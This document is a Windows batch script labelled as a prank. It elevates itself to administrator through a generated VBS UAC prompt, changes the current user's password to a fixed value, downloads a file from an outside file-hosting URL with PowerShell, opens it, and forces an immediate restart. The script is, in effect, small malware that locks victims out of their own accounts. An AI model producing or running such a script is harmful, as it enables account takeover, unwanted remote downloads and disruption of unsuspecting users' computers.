@echo off
setlocal EnableDelayedExpansion

:: Check for administrator privileges
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    :: Create a VBS script to run the batch file as administrator
    set "batchPath=%~f0"
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""!batchPath!""", "", "runas", 1 >> "%temp%\elevate.vbs"
    :: Run the VBS script
    "%temp%\elevate.vbs"
    :: Clean up
    del "%temp%\elevate.vbs"
    exit /b
)

:: Get the current username
for /F "tokens=2 delims= " %%i in ('whoami') do set USERNAME=%%i

:: Change the password
net user %USERNAME% Prank12345

:: Check if the password change was successful
if %errorlevel% neq 0 (
    echo Failed to change the password.
    exit /b
)

echo Password changed successfully.

:: Define the download URL and the local file path
set "downloadUrl=https://h.top4top.io/m_31035dpws0.mp4"
set "localFilePath=%temp%\prank_video.mp4"

:: Download the file using PowerShell
powershell -Command "Invoke-WebRequest -Uri !downloadUrl! -OutFile !localFilePath!"

:: Check if the download was successful
if not exist "!localFilePath!" (
    echo Failed to download the file.
    exit /b
)

echo File downloaded successfully.

:: Play the video for 30 seconds using the default video player
start "" "!localFilePath!"
echo Playing video for 30 seconds...
timeout /t 30 /nobreak

:: Restart the PC
shutdown /r /t 0

endlocal